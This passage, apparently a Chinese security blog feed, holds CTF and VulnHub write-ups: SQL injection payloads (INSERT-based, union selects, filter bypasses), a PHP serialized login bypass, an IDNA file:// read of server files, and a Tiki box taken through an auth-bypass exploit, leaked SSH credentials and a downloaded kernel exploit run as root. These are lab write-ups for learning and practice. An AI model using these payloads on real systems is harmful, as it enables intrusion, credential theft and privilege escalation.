<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,</span><br><span class="line">emai=&#x27;[input]&#x27;,</span><br><span class="line">icq=&#x27;[input]&#x27;,</span><br><span class="line">age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure>
<p>这样子注释符就只会注释掉email那行最后面的单引号和逗号，从而报错信息变为 <code>icq='12345' balabala</code>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213900.png" /></p>
<p>图上报错信息中的换行符也应证了我的猜想。</p>
<h1 id="level-9">Level-9</h1>
<h2 id="题目描述-8">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213950.png" /></p>
<p>在输入框填入东西后，提交查询，发现多了信息： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214029.png" /></p>
<p>因此猜测后台使用的语句是 <code>insert into</code>。</p>
<p><code>inser into</code> 语句格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">指定所要插入数据的列:</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line">一次性添加多个：（注意，如果有主键，主键必须不同）</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....),(值1, 值2,....),...</span><br></pre></td></tr></table></figure>
<h2 id="测试注入点-8">测试注入点</h2>
<p>依次对三个输入框添加单引号，发现 <code>autor=1&amp;title=1&amp;text=1'</code> 时出现报错信息： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214508.png" /></p>
<p>单独将重要信息提取：<code>'1'')</code>，可以猜测后台语句为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;input&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>输入 <code>autor=1&amp;title=1&amp;text=1')#</code> 发现页面正常，验证了猜测。</p>
<h2 id="注入过程-8">注入过程</h2>
<p>利用一次性添加多个。</p>
<p>构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456</span><br></pre></td></tr></table></figure></p>
<p>带入后为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>正好将 username 和 password 作为 autor 和 title 显示出来。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220051.png" /></p>
<p>成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679</span><br><span class="line"></span><br><span class="line">The password for the next level is: whatever_just_a_fresh_password</span><br></pre></td></tr></table></figure>
<h1 id="level-10">Level-10 ⭐</h1>
<h2 id="题目描述-9">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220508.png" /></p>
<p>点击 login 发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220532.png" /></p>
<p>也就是这里需要垂直提权。</p>
<h2 id="测试注入点-9">测试注入点</h2>
<p>由于没有多余的信息，并且url也不存在注入点，所以抓包看看： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220631.png" /></p>
<p>一般垂直提权都是看cookie，但是这里cookie的信息是登录每道题的，所以应该是post中的 <code>login</code>。将上面的字符串base64解码后得到： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220733.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这里应该需要修改username和password的值，也就是第2和第4的内容。</p>
<p>经过多次测试，还是毫无发现。就去看了下大佬的writeup，根据推测，后台语句为： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = unserialize(base64_encode(<span class="variable">$POST</span>[<span class="string">&quot;login&quot;</span>]));</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$input</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$input</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from users where username=<span class="subst">$username</span> and password=<span class="subst">$password</span>&quot;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>用户名为：<code>TheMaster</code>。密码不知道，所以 password 即为注入点。</p>
<h2 id="注入过程-9">注入过程</h2>
<p>本题要想成功登录，就得 where 后面的语句为真，即<code>username=$username</code>和<code>password=$password</code>同时为真。前者简单，后者可以这么操作，即<code>password=true</code>，这样子就能绕过where的判断。</p>
<p>因此最后的payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125; </span><br><span class="line">解释：bool型的就是b，且true为1，false为0</span><br></pre></td></tr></table></figure></p>
<p>经过base64编码后带入即可成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52  </span><br><span class="line"></span><br><span class="line">The password for the hall of fame is: make_the_internet_great_again</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>经过这十道题，发现sql注入不仅仅是常规类型的考察，还有不同语句，如：update，insert into等。有时候还要猜测后台语句的写法，或者像 Level-6一样，注入语句中返回的结果作为输入二次查询，还得明白常见的后台判断。总之，收获良多，是很好的题目。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Tiki Writeup</title>
    <url>/2022/05/15/Tiki%20Writeup/</url>
    <content><![CDATA[<p>该靶机比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/tiki-1,525/">Tiki: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>简单</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.48</span><br><span class="line">3. sudo nmap -p22,80,139,445 -A 10.0.2.48</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515162646.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>首先根据扫描结果，存在robots.txt，里面有一个新的目录 /tiki，然后再次访问该目录，发现来到了一个页面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183247.png" /></p>
<p>左上角告诉我们，这个页面的CMS是tikiwiki，搜索一下发现存在许多可利用的漏洞，但是我们现在还不直到版本信息，接下来进行路径扫描，在/tiki/README中找到了版本信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183412.png" /></p>
<p>接下来搜索对应版本的是否存在漏洞可以利用</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183448.png" /></p>
<p>正好有一个身份认证绕过的漏洞</p>
<h1 id="get-shell">3. get shell</h1>
<p>直接使用该漏洞，只需要指定ip即可 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 48927.py 10.0.2.48</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183538.png" /></p>
<p>根据结果，admin的密码已经被溢出，接下我们使用空密码就可以登录。但是，页面不允许直接使用空密码登录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183631.png" /></p>
<p>因此，使用burp抓包放过</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183721.png" /></p>
<p>成功进入后台</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183819.png" /></p>
<p>在后台测试功能点的时候，发现虽然存在文件上传（如下），但是无法利用，因为无法访问上传的文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515184846.png" /></p>
<p>又继续收集信息，在 Wiki -&gt; List Pages 发现了一个</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515184920.png" /></p>
<p>红框文件里面的内容像是认证信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">silky:Agy8Y7SPJNXQzqA</span><br></pre></td></tr></table></figure></p>
<p>想到端口信息扫描的时候发现开放了22 ssh，尝试登录，成功！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185031.png" /></p>
<p>保险起见，我把另外两个文件也看了，内容为：(第三个文件就是网页的首界面) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Hi my Name is Silky</span><br><span class="line"></span><br><span class="line">This is my third CTF. Dont give up, there is always a way to **root**!</span><br><span class="line"></span><br><span class="line">I like Cats, Frogs, Snakes and cute Doggos but thats not helpful isnt it?  </span><br><span class="line">Hmmm maybe you like something different, ... You like Hacking right?  </span><br><span class="line">I got a new CVE Number: But I constantly forget its ID :/</span><br></pre></td></tr></table></figure></p>
<p>看这个像是提示，需要使用CVE去提权到root</p>
<h1 id="权限提升">4. 权限提升</h1>
<h2 id="方法1">4.1. 方法1</h2>
<p>超简单，我查看了sudo -l 发现silky用户居然可以以root权限执行所有命令</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185357.png" /></p>
<p>那么，接下来直接切换到root即可 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185426.png" /></p>
<h2 id="方法2">4.2. 方法2</h2>
<p>根据提示可能需要使用某个CVE，因此将 linux-exploit-suggester.sh 传入到靶机，但是结果很遗憾，并没有任何可用的CVE</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185639.png" /></p>
<p>但是发现靶机的系统是Ubuntu的，而Ubuntu有一个接近万能的CVE，那就是CVE-2021-3493。使用下面的命令查看靶机是否存在gcc <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which gcc</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190025.png" /></p>
<p>因此，将漏洞利用代码传入到靶机，编译并执行即可提权到root： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. wget http://10.0.2.4:8090/exploit.c</span><br><span class="line">2. gcc exploit.c -o exp</span><br><span class="line">3. chmod +x exp</span><br><span class="line">4. ./exp</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190138.png" /></p>
<p>成功提权到root。最后进行收尾工作，读取/root目录下的flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗  █████╗ ████████╗██╗   ██╗██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗██╗</span><br><span class="line">██╔════╝██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██║</span><br><span class="line">██║     ██║   ██║██╔██╗ ██║██║  ███╗██████╔╝███████║   ██║   ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║███████╗██║</span><br><span class="line">██║     ██║   ██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║╚═╝</span><br><span class="line">╚██████╗╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║███████║██╗</span><br><span class="line"> ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝</span><br><span class="line">                                                                                                                                </span><br><span class="line">You did it ^^</span><br><span class="line">I hope you had fun.</span><br><span class="line">Share your flag with me on Twitter: S1lky_1337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag:88d8120f434c3b4221937a8cd0668588</span><br></pre></td></tr></table></figure>
<h1 id="总结">5. 总结</h1>
<p>该靶机较简单，不过有一个坑，那就是tiki的漏洞别乱用网络上的poc，否则会导致靶机页面崩溃，像下面这样</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190414.png" /></p>
<p>并且metasploit的poc也无法使用，只能重装靶机</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190448.png" /></p>
<p>涉及的攻击方法有：</p>
<ol type="1">
<li>信息收集</li>
<li>CMS可利用漏洞</li>
<li>内核漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>内核漏洞</tag>
        <tag>信息收集</tag>
        <tag>CMS漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF 2019 Pythonginx</title>
    <url>/2022/04/16/SUCTF%202019%20Pythonginx/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSUCTF%202019%5DPythonginx">Pythonginx</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，直接给了代码，不过格式很乱，查看页面源码可以得到整齐的代码 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname <span class="comment"># 提取url中的hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:  <span class="comment"># 绕过1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) <span class="comment"># 将url分割</span></span><br><span class="line">    host = parts[<span class="number">1</span>] <span class="comment"># 取其中的第二个其实和</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: <span class="comment"># 绕过2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): <span class="comment"># 将parts[1]以 . 分割</span></span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    </span><br><span class="line">    到此为止，还是parts[<span class="number">1</span>]得到的是国际标准化的hostname</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()  <span class="comment"># get flag</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure></p>
<h1 id="前置知识">前置知识</h1>
<h2 id="相关函数问题">相关函数问题</h2>
<p>参考连接：</p>
<ul>
<li>https://docs.python.org/zh-cn/3/library/urllib.parse.html</li>
<li><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">INDA</a></li>
</ul>
<p><code>urlparse(url)</code>作用：将url字符串分割成多个部分，下面是官网给的例子 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;//www.cwi.nl:80/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;www.cwi.nl:80&#x27;</span>, path=<span class="string">&#x27;/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;help/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;help/Python.html&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>除了这些部分之外，还有一些属性（详细的可以看官网），其中就有<code>hostname</code>。不严谨的解释： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://abc.cde.com/index.php?name=hello&#x27;</span></span><br><span class="line"></span><br><span class="line">其中hostname就是abc.cde.com，即http://之后，/index.php之前的部分都是</span><br></pre></td></tr></table></figure></p>
<p><code>urlsplit(url)</code>作用：将url字符串分割成多个部分，大致上与<code>urlparse(url)</code>一样。</p>
<p><code>urlunsplit(parts)</code>作用：与<code>urlsplit()</code>函数相反，这是将多个部分拼接成一个url。</p>
<p><code>h.encode('idna')</code>作用：将h进行inda编码。idna简单来说就是为了统一不同国家见的特殊字符的域名而设计出来的一种编码，说白了就是把其他语言及其特殊字符转换成英文即国际符号。</p>
<h2 id="ngnix">Ngnix</h2>
<p>ngnix的配置文件地址是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>/usr/local下的才是正在使用的配置文件，/etc/nginx那个只是默认的配置</p>
</blockquote>
<h1 id="解题">解题</h1>
<p>分析代码得到有用的信息： - 利用<code>return urllib.request.urlopen(finalUrl).read()</code>get flag，因此使用伪协议file读取； - 根据提示，域名为<code>suctf.cc</code>，且跟ngnix有关系。所以，尝试先读取ngnix的配置文件<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>； - 域名不能直接为<code>suctf.cc</code>，经过<code>h.encode('idna').decode('utf-8')</code>之后才为<code>suctf.cc</code>。这样才可以绕过前两个if判断；</p>
<p>根据idna编码规则，去<a href="https://www.compart.com/en/unicode">compart</a>，搜索相关的字符，在搜索框输入<code>/</code>时找到了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416225726.png" /></p>
<p>因此，构造payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<p>解释：此时的hostname为<code>suctf.c℆sr</code>，但是无法被被识别，所以两次的<code>host=='suctf.cc'</code>都被成功绕过。而当执行到<code>newhost.append(h.encode('idna').decode('utf-8'))</code>时，<code>c℆sr</code>变成<code>cc/usr</code>，然后在经过<code>parts[1] = '.'.join(newhost)</code>拼接，得到<code>suctf.cc/usr</code>，最后<code>finalUrl = urlunsplit(parts).split(' ')[0]</code>得到完成的url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.cc/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230456.png" /></p>
<p>找到了flag文件的位置，接下来构造如下payload，最终得到flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.c℆sr/fffffflag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230602.png" /></p>
<h1 id="总结">总结</h1>
<p>我认为本题考察的<code>idna</code>编码确实比较少见，我个人分析代码得到了需要利用某种编码方式绕过前两次if，然后经过<code>idna</code>编码再得到正确的域名，但是找不到可用的字符，经过查看大佬的writeup之后才找到。</p>
<p>大佬writeup</p>
<ul>
<li>https://mashiro01.github.io/writeup/SUCTF_2019.html</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>IDNA编码</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU2019 Web1</title>
    <url>/2022/04/13/SWPU2019%20Web1/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境发现了登录界面和注册界面。在登录界面测试了弱口令、sql注入无果后尝试先注册，然后看一下登录之后的功能点。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
<p>发现存在一个<code>申请发布广告</code>的功能点。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
<p>进入之后发现有两个输入框。我首先测试了一下XSS漏洞。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
<p>发现确实存在XSS漏洞。但是该漏洞对我们获取flag没有作用，该漏洞的最大作用是获取cookie。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
<p>因此，继续测试是否存在sql注入漏洞。发现<code>广告名</code>处存在着sql注入漏洞。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
<p>后来经过测试，发现过滤了空格、反引号、<code>-</code>、<code>#</code>、<code>or</code>、<code>and</code>等。并且没法用大小写等方式绕过。</p>
<h1 id="解题">解题</h1>
<p>空格比较简答，可以利用<code>/**/</code>绕过；过滤了注释符，可以利用单引号闭合后面的绕过，比如<code>-1' union select 1,2,3,'4</code>。但是<code>or</code>就比较难办了，因为<code>order by</code>和<code>information_schema</code>都包含<code>or</code>。因此这里涉及到了两个技巧：</p>
<ul>
<li>Bypass information_schema;</li>
<li>无列名注入</li>
</ul>
<p>[[information_schema绕过及无列名注入]]</p>
<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
<p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
<p>（flag在<code>users</code>中）</p>
<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图） ，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
<p>最终得到flag：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>无列名注入</tag>
        <tag>Bypass information_schema</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020 朴实无华</title>
    <url>/2022/04/07/WUSTCTF2020%20%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5D朴实无华">朴实无华</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后只有两行内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hack me  </span><br><span class="line">Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:3) in /var/www/html/index.php on line 4</span><br></pre></td></tr></table></figure></p>
<p>按照管理，先看一下<code>robots.txt</code>，然后查看源码，抓包。</p>
<p>查看<code>robots.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131400.png" /></p>
<p>访问该文件，得到 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;this_is_not_flag&#125;</span><br></pre></td></tr></table></figure></p>
<p>这一定不是flag。然后再看一下请求这个文件的数据包</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131559.png" /></p>
<p>发现了红框中的内容。直接访问该文件（如果出现乱码，改一下页面的编码即可。）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407131717.png" /></p>
<h1 id="解题">解题</h1>
